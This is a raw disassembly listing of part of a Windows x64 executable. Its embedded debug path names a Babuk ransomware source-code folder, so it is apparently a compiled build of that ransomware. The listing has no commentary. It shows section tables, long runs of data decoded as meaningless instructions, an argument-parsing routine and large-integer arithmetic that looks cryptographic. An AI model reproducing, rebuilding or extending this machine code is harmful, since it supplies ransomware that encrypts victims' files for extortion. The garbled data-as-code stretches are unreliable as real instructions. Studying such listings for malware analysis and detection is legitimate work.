   140001b47:	5d                   	pop    %rbp
   140001b48:	6f                   	outsl  (%rsi),(%dx)
   140001b49:	63 a5 78 60 2f 17    	movsxd 0x172f6078(%rbp),%esp
   140001b4f:	43 14 78             	rex.XB adc $0x78,%al
   140001b52:	c8 84 72 ab          	enter  $0x7284,$0xab
   140001b56:	f0 a1 08 02 c7 8c ec 	lock movabs 0x1a6439ec8cc70208,%eax
   140001b5d:	39 64 1a 
   140001b60:	fa                   	cli
   140001b61:	ff                   	(bad)
   140001b62:	be 90 28 1e 63       	mov    $0x631e2890,%esi
   140001b67:	23 eb                	and    %ebx,%ebp
   140001b69:	6c                   	insb   (%dx),(%rdi)
   140001b6a:	50                   	push   %rax
   140001b6b:	a4                   	movsb  (%rsi),(%rdi)
   140001b6c:	e9 bd 82 de f7       	jmp    0x137de9e2e
   140001b71:	a3 f9 be 15 79 c6 b2 	movabs %eax,0x78f2b2c67915bef9
   140001b78:	f2 78 
   140001b7a:	71 c6                	jno    0x140001b42
   140001b7c:	2b 53 72             	sub    0x72(%rbx),%edx
   140001b7f:	e3 ce                	jrcxz  0x140001b4f
   140001b81:	3e 27                	ds (bad)
   140001b83:	ca 9c 61             	lret   $0x619c
   140001b86:	26 ea                	es (bad)
   140001b88:	c7 b8 86 d1 07       	xbegin 0x147d1a245,(bad)
   140001b8d:	c2 c0 21             	ret    $0x21c0
   140001b90:	d6                   	udb
   140001b91:	7d da                	jge    0x140001b6d
   140001b93:	ea                   	(bad)
   140001b94:	1e                   	(bad)
   140001b95:	eb e0                	jmp    0x140001b77
   140001b97:	cd 7f                	int    $0x7f
   140001b99:	4f 7d f5             	rex.WRXB jge 0x140001b91
   140001b9c:	78 d1                	js     0x140001b6f
   140001b9e:	6e                   	outsb  (%rsi),(%dx)
   140001b9f:	ee                   	out    %al,(%dx)
   140001ba0:	aa                   	stos   %al,(%rdi)
   140001ba1:	67 f0 06             	addr32 lock (bad)
   140001ba4:	ba 6f 17 72 c5       	mov    $0xc572176f,%edx
   140001ba9:	7d 63                	jge    0x140001c0e
   140001bab:	0a a6 98 c8 a2 04    	or     0x4a2c898(%rsi),%ah
   140001bb1:	98                   	cwtl
   140001bb2:	3f                   	(bad)
   140001bb3:	11 ae 0d f9 be 35    	adc    %ebp,0x35bef90d(%rsi)
   140001bb9:	0b 71 1b             	or     0x1b(%rcx),%esi
   140001bbc:	1b 47 1c             	sbb    0x1c(%rdi),%eax
   140001bbf:	13 f5                	adc    %ebp,%esi
   140001bc1:	77 db                	ja     0x140001b9e
   140001bc3:	28 84 7d 04 23 7b ab 	sub    %al,-0x5484dcfc(%rbp,%rdi,2)
   140001bca:	ca 32 93             	lret   $0x9332
   140001bcd:	24 c7                	and    $0xc7,%al
   140001bcf:	40 0a be 9e 3c bc be 	or     -0x4143c362(%rsi),%dil
   140001bd6:	c9                   	leave
   140001bd7:	15 c4 67 1d 43       	adc    $0x431d67c4,%eax
   140001bdc:	4c 0d 10 9c be d4    	rex.WR or $0xffffffffd4be9c10,%rax
   140001be2:	c5 4c b6             	(bad)
   140001be5:	42                   	rex.X
   140001be6:	3e cb                	ds lret
   140001be8:	9c                   	pushf
   140001be9:	29 7f 59             	sub    %edi,0x59(%rdi)
   140001bec:	2a 7e 65             	sub    0x65(%rsi),%bh
   140001bef:	fc                   	cld
   140001bf0:	ab                   	stos   %eax,(%rdi)
   140001bf1:	6f                   	outsl  (%rsi),(%dx)
   140001bf2:	cb                   	lret
   140001bf3:	5f                   	pop    %rdi
   140001bf4:	ec                   	in     (%dx),%al
   140001bf5:	fa                   	cli
   140001bf6:	d6                   	udb
   140001bf7:	3a 8c 19 44 6c 17 58 	cmp    0x58176c44(%rcx,%rbx,1),%cl
   140001bfe:	47                   	rex.RXB
   140001bff:	4a                   	rex.WX
   140001c00:	67 e6 09             	addr32 out %al,$0x9
   140001c03:	6a 08                	push   $0x8
   140001c05:	c9                   	leave
   140001c06:	bc f3 85 ae 67       	mov    $0x67ae85f3,%esp
   140001c0b:	bb 3b a7 ca 84       	mov    $0x84caa73b,%ebx
   140001c10:	72 f3                	jb     0x140001c05
   140001c12:	6e                   	outsb  (%rsi),(%dx)
   140001c13:	3c 2b                	cmp    $0x2b,%al
   140001c15:	f8                   	clc
   140001c16:	94                   	xchg   %eax,%esp
   140001c17:	fe                   	(bad)
   140001c18:	3a f5                	cmp    %ch,%dh
   140001c1a:	4f a5                	rex.WRXB movsq (%rsi),(%rdi)
   140001c1c:	f1                   	int1
   140001c1d:	36 1d 5f 7f 52 0e    	ss sbb $0xe527f5f,%eax
   140001c23:	51                   	push   %rcx
   140001c24:	d1 82 e6 ad 8c 68    	roll   $1,0x688cade6(%rdx)
   140001c2a:	05 9b 1f 6c 3e       	add    $0x3e6c1f9b,%eax
   140001c2f:	2b ab d9 83 1f 6b    	sub    0x6b1f83d9(%rbx),%ebp
   140001c35:	bd 41 fb 19 cd       	mov    $0xcd19fb41,%ebp
   140001c3a:	e0 5b                	loopne 0x140001c97
   140001c3c:	79 21                	jns    0x140001c5f
   140001c3e:	7e 13                	jle    0x140001c53
   140001c40:	41 db 01             	fildl  (%r9)
   140001c43:	00 00                	add    %al,(%rax)
   140001c45:	00 00                	add    %al,(%rax)
   140001c47:	00 41 db             	add    %al,-0x25(%rcx)
   140001c4a:	01 00                	add    %eax,(%rax)
   140001c4c:	00 00                	add    %al,(%rax)
   140001c4e:	00 00                	add    %al,(%rax)
   140001c50:	00 01                	add    %al,(%rcx)
   140001c52:	02 03                	add    (%rbx),%al
   140001c54:	08 09                	or     %cl,(%rcx)
   140001c56:	0a 0b                	or     (%rbx),%cl
   140001c58:	00 01                	add    %al,(%rcx)
   140001c5a:	02 03                	add    (%rbx),%al
   140001c5c:	08 09                	or     %cl,(%rcx)
   140001c5e:	0a 0b                	or     (%rbx),%cl
   140001c60:	40 01 00             	rex add %eax,(%rax)
	...
   140001cb7:	00 00                	add    %al,(%rax)
   140001cb9:	b0 00                	mov    $0x0,%al
   140001cbb:	40 01 00             	rex add %eax,(%rax)
	...
   140001cce:	00 00                	add    %al,(%rax)
   140001cd0:	e0 d1                	loopne 0x140001ca3
   140001cd2:	00 40 01             	add    %al,0x1(%rax)
   140001cd5:	00 00                	add    %al,(%rax)
   140001cd7:	00 f0                	add    %dh,%al
   140001cd9:	d1 00                	roll   $1,(%rax)
   140001cdb:	40 01 00             	rex add %eax,(%rax)
	...
   140001cee:	00 00                	add    %al,(%rax)
   140001cf0:	00 01                	add    %al,(%rcx)
	...
   140001d5e:	00 00                	add    %al,(%rax)
   140001d60:	80 1e 00             	sbbb   $0x0,(%rsi)
   140001d63:	40 01 00             	rex add %eax,(%rax)
	...
   140001d76:	00 00                	add    %al,(%rax)
   140001d78:	e8 d1 00 40 01       	call   0x141401e4e
   140001d7d:	00 00                	add    %al,(%rax)
   140001d7f:	00 f8                	add    %bh,%al
   140001d81:	d1 00                	roll   $1,(%rax)
   140001d83:	40 01 00             	rex add %eax,(%rax)
   140001d86:	00 00                	add    %al,(%rax)
   140001d88:	00 d2                	add    %dl,%dl
   140001d8a:	00 40 01             	add    %al,0x1(%rax)
   140001d8d:	00 00                	add    %al,(%rax)
   140001d8f:	00 08                	add    %cl,(%rax)
   140001d91:	d2 00                	rolb   %cl,(%rax)
   140001d93:	40 01 00             	rex add %eax,(%rax)
	...
   140001da2:	00 00                	add    %al,(%rax)
   140001da4:	82                   	(bad)
   140001da5:	c1 8e 68 00 00 00 00 	rorl   $0x0,0x68(%rsi)
   140001dac:	02 00                	add    (%rax),%al
   140001dae:	00 00                	add    %al,(%rax)
   140001db0:	8a 00                	mov    (%rax),%al
   140001db2:	00 00                	add    %al,(%rax)
   140001db4:	cc                   	int3
   140001db5:	1e                   	(bad)
   140001db6:	00 00                	add    %al,(%rax)
   140001db8:	cc                   	int3
   140001db9:	12 00                	adc    (%rax),%al
   140001dbb:	00 00                	add    %al,(%rax)
   140001dbd:	00 00                	add    %al,(%rax)
   140001dbf:	00 82 c1 8e 68 00    	add    %al,0x688ec1(%rdx)
   140001dc5:	00 00                	add    %al,(%rax)
   140001dc7:	00 0c 00             	add    %cl,(%rax,%rax,1)
   140001dca:	00 00                	add    %al,(%rax)
   140001dcc:	14 00                	adc    $0x0,%al
   140001dce:	00 00                	add    %al,(%rax)
   140001dd0:	58                   	pop    %rax
   140001dd1:	1f                   	(bad)
   140001dd2:	00 00                	add    %al,(%rax)
   140001dd4:	58                   	pop    %rax
   140001dd5:	13 00                	adc    (%rax),%eax
   140001dd7:	00 00                	add    %al,(%rax)
   140001dd9:	00 00                	add    %al,(%rax)
   140001ddb:	00 82 c1 8e 68 00    	add    %al,0x688ec1(%rdx)
   140001de1:	00 00                	add    %al,(%rax)
   140001de3:	00 0d 00 00 00 48    	add    %cl,0x48000000(%rip)        # 0x188001de9
   140001de9:	01 00                	add    %eax,(%rax)
   140001deb:	00 6c 1f 00          	add    %ch,0x0(%rdi,%rbx,1)
   140001def:	00 6c 13 00          	add    %ch,0x0(%rbx,%rdx,1)
   140001df3:	00 00                	add    %al,(%rax)
   140001df5:	00 00                	add    %al,(%rax)
   140001df7:	00 82 c1 8e 68 00    	add    %al,0x688ec1(%rdx)
   140001dfd:	00 00                	add    %al,(%rax)
   140001dff:	00 0e                	add    %cl,(%rsi)
	...
   140001e7d:	00 00                	add    %al,(%rax)
   140001e7f:	00 18                	add    %bl,(%rax)
   140001e81:	00 00                	add    %al,(%rax)
   140001e83:	00 03                	add    %al,(%rbx)
   140001e85:	80 03 80             	addb   $0x80,(%rbx)
   140001e88:	98                   	cwtl
   140001e89:	1e                   	(bad)
   140001e8a:	00 00                	add    %al,(%rax)
   140001e8c:	0c 00                	or     $0x0,%al
   140001e8e:	00 00                	add    %al,(%rax)
   140001e90:	a4                   	movsb  (%rsi),(%rdi)
   140001e91:	1e                   	(bad)
   140001e92:	00 00                	add    %al,(%rax)
   140001e94:	28 00                	sub    %al,(%rax)
   140001e96:	00 00                	add    %al,(%rax)
   140001e98:	5f                   	pop    %rdi
   140001e99:	9a                   	(bad)
   140001e9a:	00 00                	add    %al,(%rax)
   140001e9c:	db 9a 00 00 f0 9a    	fistpl -0x65100000(%rdx)
   140001ea2:	00 00                	add    %al,(%rax)
   140001ea4:	00 10                	add    %dl,(%rax)
   140001ea6:	00 00                	add    %al,(%rax)
   140001ea8:	10 00                	adc    %al,(%rax)
   140001eaa:	00 00                	add    %al,(%rax)
   140001eac:	60                   	(bad)
   140001ead:	1c 00                	sbb    $0x0,%al
   140001eaf:	00 40 01             	add    %al,0x1(%rax)
   140001eb2:	00 00                	add    %al,(%rax)
   140001eb4:	00 9a 00 00 00 02    	add    %bl,0x2000000(%rdx)
   140001eba:	00 00                	add    %al,(%rax)
   140001ebc:	60                   	(bad)
   140001ebd:	9c                   	pushf
   140001ebe:	00 00                	add    %al,(%rax)
   140001ec0:	10 00                	adc    %al,(%rax)
   140001ec2:	00 00                	add    %al,(%rax)
   140001ec4:	4c a0 00 00 24 00 00 	rex.WR movabs 0x5352000000240000,%al
   140001ecb:	00 52 53 
   140001ece:	44 53                	rex.R push %rbx
   140001ed0:	49 f8                	rex.WB clc
   140001ed2:	5c                   	pop    %rsp
   140001ed3:	81 23 b9 f6 42 a9    	andl   $0xa942f6b9,(%rbx)
   140001ed9:	8f                   	(bad)
   140001eda:	b9 27 d3 76 78       	mov    $0x7876d327,%ecx
   140001edf:	86 01                	xchg   %al,(%rcx)
   140001ee1:	00 00                	add    %al,(%rax)
   140001ee3:	00 43 3a             	add    %al,0x3a(%rbx)
   140001ee6:	5c                   	pop    %rsp
   140001ee7:	55                   	push   %rbp
   140001ee8:	73 65                	jae    0x140001f4f
   140001eea:	72 73                	jb     0x140001f5f
   140001eec:	5c                   	pop    %rsp
   140001eed:	6a 6f                	push   $0x6f
   140001eef:	72 64                	jb     0x140001f55
   140001ef1:	61                   	(bad)
   140001ef2:	6e                   	outsb  (%rsi),(%dx)
   140001ef3:	5c                   	pop    %rsp
   140001ef4:	44 6f                	rex.R outsl (%rsi),(%dx)
   140001ef6:	77 6e                	ja     0x140001f66
   140001ef8:	6c                   	insb   (%dx),(%rdi)
   140001ef9:	6f                   	outsl  (%rsi),(%dx)
   140001efa:	61                   	(bad)
   140001efb:	64 73 5c             	fs jae 0x140001f5a
   140001efe:	42 61                	rex.X (bad)
   140001f00:	62 75 6b 52 61       	(bad)
   140001f05:	6e                   	outsb  (%rsi),(%dx)
   140001f06:	73 6f                	jae    0x140001f77
   140001f08:	6d                   	insl   (%dx),(%rdi)
   140001f09:	77 61                	ja     0x140001f6c
   140001f0b:	72 65                	jb     0x140001f72
   140001f0d:	53                   	push   %rbx
   140001f0e:	6f                   	outsl  (%rsi),(%dx)
   140001f0f:	75 72                	jne    0x140001f83
   140001f11:	63 65 43             	movsxd 0x43(%rbp),%esp
   140001f14:	6f                   	outsl  (%rsi),(%dx)
   140001f15:	64 65 2d 6d 61 69 6e 	fs gs sub $0x6e69616d,%eax
   140001f1c:	5c                   	pop    %rsp
   140001f1d:	42 61                	rex.X (bad)
   140001f1f:	62 75 6b 52 61       	(bad)
   140001f24:	6e                   	outsb  (%rsi),(%dx)
   140001f25:	73 6f                	jae    0x140001f96
   140001f27:	6d                   	insl   (%dx),(%rdi)
   140001f28:	77 61                	ja     0x140001f8b
   140001f2a:	72 65                	jb     0x140001f91
   140001f2c:	53                   	push   %rbx
   140001f2d:	6f                   	outsl  (%rsi),(%dx)
   140001f2e:	75 72                	jne    0x140001fa2
   140001f30:	63 65 43             	movsxd 0x43(%rbp),%esp
   140001f33:	6f                   	outsl  (%rsi),(%dx)
   140001f34:	64 65 2d 6d 61 69 6e 	fs gs sub $0x6e69616d,%eax
   140001f3b:	5c                   	pop    %rsp
   140001f3c:	77 69                	ja     0x140001fa7
   140001f3e:	6e                   	outsb  (%rsi),(%dx)
   140001f3f:	64 6f                	outsl  %fs:(%rsi),(%dx)
   140001f41:	77 73                	ja     0x140001fb6
   140001f43:	5c                   	pop    %rsp
   140001f44:	78 36                	js     0x140001f7c
   140001f46:	34 5c                	xor    $0x5c,%al
   140001f48:	52                   	push   %rdx
   140001f49:	65 6c                	gs insb (%dx),(%rdi)
   140001f4b:	65 61                	gs (bad)
   140001f4d:	73 65                	jae    0x140001fb4
   140001f4f:	5c                   	pop    %rsp
   140001f50:	64 2e 70 64          	fs jo,pn 0x140001fb8
   140001f54:	62                   	(bad)
   140001f55:	00 00                	add    %al,(%rax)
   140001f57:	00 00                	add    %al,(%rax)
   140001f59:	00 00                	add    %al,(%rax)
   140001f5b:	00 0e                	add    %cl,(%rsi)
   140001f5d:	00 00                	add    %al,(%rax)
   140001f5f:	00 0e                	add    %cl,(%rsi)
   140001f61:	00 00                	add    %al,(%rax)
   140001f63:	00 08                	add    %cl,(%rax)
   140001f65:	00 00                	add    %al,(%rax)
   140001f67:	00 06                	add    %al,(%rsi)
   140001f69:	00 00                	add    %al,(%rax)
   140001f6b:	00 47 43             	add    %al,0x43(%rdi)
   140001f6e:	54                   	push   %rsp
   140001f6f:	4c 00 10             	rex.WR add %r10b,(%rax)
   140001f72:	00 00                	add    %al,(%rax)
   140001f74:	80 0e 00             	orb    $0x0,(%rsi)
   140001f77:	00 2e                	add    %ch,(%rsi)
   140001f79:	72 64                	jb     0x140001fdf
   140001f7b:	61                   	(bad)
   140001f7c:	74 61                	je     0x140001fdf
   140001f7e:	00 00                	add    %al,(%rax)
   140001f80:	80 1e 00             	sbbb   $0x0,(%rsi)
   140001f83:	00 4c 00 00          	add    %cl,0x0(%rax,%rax,1)
   140001f87:	00 2e                	add    %ch,(%rsi)
   140001f89:	72 64                	jb     0x140001fef
   140001f8b:	61                   	(bad)
   140001f8c:	74 61                	je     0x140001fef
   140001f8e:	24 76                	and    $0x76,%al
   140001f90:	6f                   	outsl  (%rsi),(%dx)
   140001f91:	6c                   	insb   (%dx),(%rdi)
   140001f92:	74 6d                	je     0x140002001
   140001f94:	64 00 00             	add    %al,%fs:(%rax)
   140001f97:	00 cc                	add    %cl,%ah
   140001f99:	1e                   	(bad)
   140001f9a:	00 00                	add    %al,(%rax)
   140001f9c:	f4                   	hlt
   140001f9d:	01 00                	add    %eax,(%rax)
   140001f9f:	00 2e                	add    %ch,(%rsi)
   140001fa1:	72 64                	jb     0x140002007
   140001fa3:	61                   	(bad)
   140001fa4:	74 61                	je     0x140002007
   140001fa6:	24 7a                	and    $0x7a,%al
   140001fa8:	7a 7a                	jp     0x140002024
   140001faa:	64 62 67 00 00 00    	(bad)
   140001fb0:	c0 20 00             	shlb   $0x0,(%rax)
   140001fb3:	00 b0 7b 00 00 2e    	add    %dh,0x2e00007b(%rax)
   140001fb9:	74 65                	je     0x140002020
   140001fbb:	78 74                	js     0x140002031
   140001fbd:	24 6d                	and    $0x6d,%al
   140001fbf:	6e                   	outsb  (%rsi),(%dx)
   140001fc0:	00 00                	add    %al,(%rax)
   140001fc2:	00 00                	add    %al,(%rax)
   140001fc4:	70 9c                	jo     0x140001f62
   140001fc6:	00 00                	add    %al,(%rax)
   140001fc8:	38 00                	cmp    %al,(%rax)
   140001fca:	00 00                	add    %al,(%rax)
   140001fcc:	2e 74 65             	je,pn  0x140002034
   140001fcf:	78 74                	js     0x140002045
   140001fd1:	24 6d                	and    $0x6d,%al
   140001fd3:	6e                   	outsb  (%rsi),(%dx)
   140001fd4:	24 30                	and    $0x30,%al
   140001fd6:	30 00                	xor    %al,(%rax)
   140001fd8:	a8 9c                	test   $0x9c,%al
   140001fda:	00 00                	add    %al,(%rax)
   140001fdc:	dc 03                	faddl  (%rbx)
   140001fde:	00 00                	add    %al,(%rax)
   140001fe0:	2e 78 64             	js,pn  0x140002047
   140001fe3:	61                   	(bad)
   140001fe4:	74 61                	je     0x140002047
   140001fe6:	00 00                	add    %al,(%rax)
   140001fe8:	00 b0 00 00 90 00    	add    %dh,0x900000(%rax)
   140001fee:	00 00                	add    %al,(%rax)
   140001ff0:	2e 64 61             	cs fs (bad)
   140001ff3:	74 61                	je     0x140002056
   140001ff5:	00 00                	add    %al,(%rax)
   140001ff7:	00 90 b0 00 00 cc    	add    %dl,-0x33ffff50(%rax)
   140001ffd:	05 00 00 2e 62       	add    $0x622e0000,%eax
   140002002:	73 73                	jae    0x140002077
   140002004:	00 00                	add    %al,(%rax)
   140002006:	00 00                	add    %al,(%rax)
   140002008:	00 c0                	add    %al,%al
   14000200a:	00 00                	add    %al,(%rax)
   14000200c:	88 02                	mov    %al,(%rdx)
   14000200e:	00 00                	add    %al,(%rax)
   140002010:	2e 70 64             	jo,pn  0x140002077
   140002013:	61                   	(bad)
   140002014:	74 61                	je     0x140002077
   140002016:	00 00                	add    %al,(%rax)
   140002018:	00 d0                	add    %dl,%al
   14000201a:	00 00                	add    %al,(%rax)
   14000201c:	e0 01                	loopne 0x14000201f
   14000201e:	00 00                	add    %al,(%rax)
   140002020:	2e 69 64 61 74 61 24 	cs imul $0x352461,0x74(%rcx,%riz,2),%esp
   140002027:	35 00 
   140002029:	00 00                	add    %al,(%rax)
   14000202b:	00 e0                	add    %ah,%al
   14000202d:	d1 00                	roll   $1,(%rax)
   14000202f:	00 30                	add    %dh,(%rax)
   140002031:	00 00                	add    %al,(%rax)
   140002033:	00 2e                	add    %ch,(%rsi)
   140002035:	30 30                	xor    %dh,(%rax)
   140002037:	63 66 67             	movsxd 0x67(%rsi),%esp
   14000203a:	00 00                	add    %al,(%rax)
   14000203c:	10 d2                	adc    %dl,%dl
   14000203e:	00 00                	add    %al,(%rax)
   140002040:	64 00 00             	add    %al,%fs:(%rax)
   140002043:	00 2e                	add    %ch,(%rsi)
   140002045:	69 64 61 74 61 24 32 	imul   $0x322461,0x74(%rcx,%riz,2),%esp
   14000204c:	00 
   14000204d:	00 00                	add    %al,(%rax)
   14000204f:	00 74 d2 00          	add    %dh,0x0(%rdx,%rdx,8)
   140002053:	00 14 00             	add    %dl,(%rax,%rax,1)
   140002056:	00 00                	add    %al,(%rax)
   140002058:	2e 69 64 61 74 61 24 	cs imul $0x332461,0x74(%rcx,%riz,2),%esp
   14000205f:	33 00 
   140002061:	00 00                	add    %al,(%rax)
   140002063:	00 88 d2 00 00 e0    	add    %cl,-0x1fffff2e(%rax)
   140002069:	01 00                	add    %eax,(%rax)
   14000206b:	00 2e                	add    %ch,(%rsi)
   14000206d:	69 64 61 74 61 24 34 	imul   $0x342461,0x74(%rcx,%riz,2),%esp
   140002074:	00 
   140002075:	00 00                	add    %al,(%rax)
   140002077:	00 68 d4             	add    %ch,-0x2c(%rax)
   14000207a:	00 00                	add    %al,(%rax)
   14000207c:	1e                   	(bad)
   14000207d:	04 00                	add    $0x0,%al
   14000207f:	00 2e                	add    %ch,(%rsi)
   140002081:	69 64 61 74 61 24 36 	imul   $0x362461,0x74(%rcx,%riz,2),%esp
   140002088:	00 
   140002089:	00 00                	add    %al,(%rax)
   14000208b:	00 00                	add    %al,(%rax)
   14000208d:	e0 00                	loopne 0x14000208f
   14000208f:	00 60 00             	add    %ah,0x0(%rax)
   140002092:	00 00                	add    %al,(%rax)
   140002094:	2e 72 73             	jb,pn  0x14000210a
   140002097:	72 63                	jb     0x1400020fc
   140002099:	24 30                	and    $0x30,%al
   14000209b:	31 00                	xor    %eax,(%rax)
   14000209d:	00 00                	add    %al,(%rax)
   14000209f:	00 60 e0             	add    %ah,-0x20(%rax)
   1400020a2:	00 00                	add    %al,(%rax)
   1400020a4:	80 01 00             	addb   $0x0,(%rcx)
   1400020a7:	00 2e                	add    %ch,(%rsi)
   1400020a9:	72 73                	jb     0x14000211e
   1400020ab:	72 63                	jb     0x140002110
   1400020ad:	24 30                	and    $0x30,%al
   1400020af:	32 00                	xor    (%rax),%al
	...
   1400020bd:	00 00                	add    %al,(%rax)
   1400020bf:	00 48 89             	add    %cl,-0x77(%rax)
   1400020c2:	5c                   	pop    %rsp
   1400020c3:	24 08                	and    $0x8,%al
   1400020c5:	48 8b da             	mov    %rdx,%rbx
   1400020c8:	83 f9 01             	cmp    $0x1,%ecx
   1400020cb:	7e 70                	jle    0x14000213d
   1400020cd:	4c 63 d9             	movslq %ecx,%r11
   1400020d0:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   1400020d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400020dd:	00 00 00 
   1400020e0:	4a 8b 04 d3          	mov    (%rbx,%r10,8),%rax
   1400020e4:	45 33 c9             	xor    %r9d,%r9d
   1400020e7:	66 83 38 2d          	cmpw   $0x2d,(%rax)
   1400020eb:	75 48                	jne    0x140002135
   1400020ed:	0f 1f 00             	nopl   (%rax)
   1400020f0:	0f b7 50 02          	movzwl 0x2(%rax),%edx
   1400020f4:	48 83 c0 02          	add    $0x2,%rax
   1400020f8:	66 83 fa 2d          	cmp    $0x2d,%dx
   1400020fc:	74 f2                	je     0x1400020f0
   1400020fe:	66 83 fa 3d          	cmp    $0x3d,%dx
   140002102:	74 41                	je     0x140002145
   140002104:	0f 1f 40 00          	nopl   0x0(%rax)
   140002108:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000210f:	00 
   140002110:	66 41 3b 10          	cmp    (%r8),%dx
   140002114:	41 8d 49 01          	lea    0x1(%r9),%ecx
   140002118:	0f b7 50 02          	movzwl 0x2(%rax),%edx
   14000211c:	41 0f 44 c9          	cmove  %r9d,%ecx
   140002120:	48 83 c0 02          	add    $0x2,%rax
   140002124:	49 83 c0 02          	add    $0x2,%r8
   140002128:	44 8b c9             	mov    %ecx,%r9d
   14000212b:	66 83 fa 3d          	cmp    $0x3d,%dx
   14000212f:	75 df                	jne    0x140002110
   140002131:	85 c9                	test   %ecx,%ecx
   140002133:	74 10                	je     0x140002145
   140002135:	49 ff c2             	inc    %r10
   140002138:	4d 3b d3             	cmp    %r11,%r10
   14000213b:	7c a3                	jl     0x1400020e0
   14000213d:	33 c0                	xor    %eax,%eax
   14000213f:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140002144:	c3                   	ret
   140002145:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000214a:	48 83 c0 02          	add    $0x2,%rax
   14000214e:	c3                   	ret
   14000214f:	cc                   	int3
   140002150:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002155:	4c 63 0a             	movslq (%rdx),%r9
   140002158:	4c 8b d2             	mov    %rdx,%r10
   14000215b:	49 63 00             	movslq (%r8),%rax
   14000215e:	48 8b d9             	mov    %rcx,%rbx
   140002161:	4c 0f af c8          	imul   %rax,%r9
   140002165:	4d 8b d8             	mov    %r8,%r11
   140002168:	4c 89 09             	mov    %r9,(%rcx)
   14000216b:	4c 63 4a 08          	movslq 0x8(%rdx),%r9
   14000216f:	49 63 00             	movslq (%r8),%rax
   140002172:	4c 63 02             	movslq (%rdx),%r8
   140002175:	4c 0f af c8          	imul   %rax,%r9
   140002179:	49 63 43 08          	movslq 0x8(%r11),%rax
   14000217d:	4c 0f af c0          	imul   %rax,%r8
   140002181:	4d 03 c8             	add    %r8,%r9
   140002184:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   140002188:	48 63 52 10          	movslq 0x10(%rdx),%rdx
   14000218c:	49 63 03             	movslq (%r11),%rax
   14000218f:	49 63 4a 08          	movslq 0x8(%r10),%rcx
   140002193:	48 0f af d0          	imul   %rax,%rdx
   140002197:	49 63 43 08          	movslq 0x8(%r11),%rax
   14000219b:	48 0f af c8          	imul   %rax,%rcx
   14000219f:	49 63 02             	movslq (%r10),%rax
   1400021a2:	48 8d 14 4a          	lea    (%rdx,%rcx,2),%rdx
   1400021a6:	49 63 4b 10          	movslq 0x10(%r11),%rcx
   1400021aa:	48 0f af c8          	imul   %rax,%rcx
   1400021ae:	48 03 d1             	add    %rcx,%rdx
   1400021b1:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   1400021b5:	49 63 43 10          	movslq 0x10(%r11),%rax
   1400021b9:	49 63 52 08          	movslq 0x8(%r10),%rdx
   1400021bd:	49 63 4b 08          	movslq 0x8(%r11),%rcx
   1400021c1:	48 0f af d0          	imul   %rax,%rdx
   1400021c5:	49 63 42 10          	movslq 0x10(%r10),%rax
   1400021c9:	48 0f af c8          	imul   %rax,%rcx
   1400021cd:	49 63 03             	movslq (%r11),%rax
   1400021d0:	48 03 d1             	add    %rcx,%rdx
   1400021d3:	49 63 4a 18          	movslq 0x18(%r10),%rcx
   1400021d7:	48 0f af c8          	imul   %rax,%rcx
   1400021db:	49 63 43 18          	movslq 0x18(%r11),%rax
   1400021df:	48 03 d1             	add    %rcx,%rdx
   1400021e2:	49 63 0a             	movslq (%r10),%rcx
   1400021e5:	48 0f af c8          	imul   %rax,%rcx
   1400021e9:	48 03 d1             	add    %rcx,%rdx
   1400021ec:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400021f0:	49 63 43 18          	movslq 0x18(%r11),%rax
   1400021f4:	49 63 52 08          	movslq 0x8(%r10),%rdx
   1400021f8:	49 63 4b 08          	movslq 0x8(%r11),%rcx
   1400021fc:	48 0f af d0          	imul   %rax,%rdx
   140002200:	49 63 42 18          	movslq 0x18(%r10),%rax
   140002204:	48 0f af c8          	imul   %rax,%rcx
   140002208:	49 63 03             	movslq (%r11),%rax
   14000220b:	48 03 d1             	add    %rcx,%rdx
   14000220e:	49 63 4a 20          	movslq 0x20(%r10),%rcx
   140002212:	48 0f af c8          	imul   %rax,%rcx
   140002216:	49 63 43 10          	movslq 0x10(%r11),%rax
   14000221a:	48 8d 14 51          	lea    (%rcx,%rdx,2),%rdx
   14000221e:	49 63 4a 10          	movslq 0x10(%r10),%rcx
   140002222:	48 0f af c8          	imul   %rax,%rcx
   140002226:	49 63 43 20          	movslq 0x20(%r11),%rax
   14000222a:	48 03 d1             	add    %rcx,%rdx
   14000222d:	49 63 0a             	movslq (%r10),%rcx
   140002230:	48 0f af c8          	imul   %rax,%rcx
   140002234:	48 03 d1             	add    %rcx,%rdx
   140002237:	48 89 53 20          	mov    %rdx,0x20(%rbx)
   14000223b:	49 63 43 20          	movslq 0x20(%r11),%rax
   14000223f:	49 63 52 08          	movslq 0x8(%r10),%rdx
   140002243:	49 63 4b 28          	movslq 0x28(%r11),%rcx
   140002247:	48 0f af d0          	imul   %rax,%rdx
   14000224b:	49 63 02             	movslq (%r10),%rax
   14000224e:	48 0f af c8          	imul   %rax,%rcx
   140002252:	49 63 42 20          	movslq 0x20(%r10),%rax
   140002256:	48 03 d1             	add    %rcx,%rdx
   140002259:	49 63 4b 08          	movslq 0x8(%r11),%rcx
   14000225d:	48 0f af c8          	imul   %rax,%rcx
   140002261:	49 63 43 18          	movslq 0x18(%r11),%rax
   140002265:	48 03 d1             	add    %rcx,%rdx
   140002268:	49 63 4a 10          	movslq 0x10(%r10),%rcx
   14000226c:	48 0f af c8          	imul   %rax,%rcx
   140002270:	49 63 42 18          	movslq 0x18(%r10),%rax
   140002274:	48 03 d1             	add    %rcx,%rdx
   140002277:	49 63 4b 10          	movslq 0x10(%r11),%rcx
   14000227b:	48 0f af c8          	imul   %rax,%rcx
   14000227f:	48 03 d1             	add    %rcx,%rdx
   140002282:	49 63 03             	movslq (%r11),%rax
   140002285:	49 63 4a 28          	movslq 0x28(%r10),%rcx
   140002289:	48 0f af c8          	imul   %rax,%rcx
   14000228d:	48 03 d1             	add    %rcx,%rdx
   140002290:	48 89 53 28          	mov    %rdx,0x28(%rbx)
   140002294:	49 63 43 18          	movslq 0x18(%r11),%rax
   140002298:	49 63 52 18          	movslq 0x18(%r10),%rdx
   14000229c:	48 0f af d0          	imul   %rax,%rdx
   1400022a0:	49 63 42 28          	movslq 0x28(%r10),%rax
